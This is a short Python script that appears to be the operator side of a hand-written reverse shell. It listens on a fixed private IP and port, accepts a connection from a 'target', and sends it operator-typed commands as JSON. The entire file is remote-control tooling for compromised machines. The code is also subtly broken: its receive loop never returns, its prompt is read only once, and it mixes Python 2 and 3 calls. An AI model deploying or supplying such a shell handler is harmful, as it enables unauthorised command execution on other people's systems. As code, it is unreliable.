#!/usr/bin/python
import socket
import json

def relaible_send(data):
	global json_data
	json_data=json.dumps(data).encode('utf-8')
	target.send(json_data)

def relaible_recv():
	json_data=""
	while True:
		try:
			json_data=json_data+str(target.recv(1024))
			print(json.loads(json_data))
		except ValueError:
			continue

def shell():
	command=raw_input("#~"+str(ip))
	while True:
		relaible_send(command)
		if command=='q':
			break
		else:
			result=relaible_recv()
			print(result)

def server():
	global s
	global ip
	global target
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(("192.168.1.9",54321))
	s.listen(5)
	print("Listening for incoming connections...")
	target,ip=s.accept()
	print("Target Connected!")

server()
shell()
s.close()
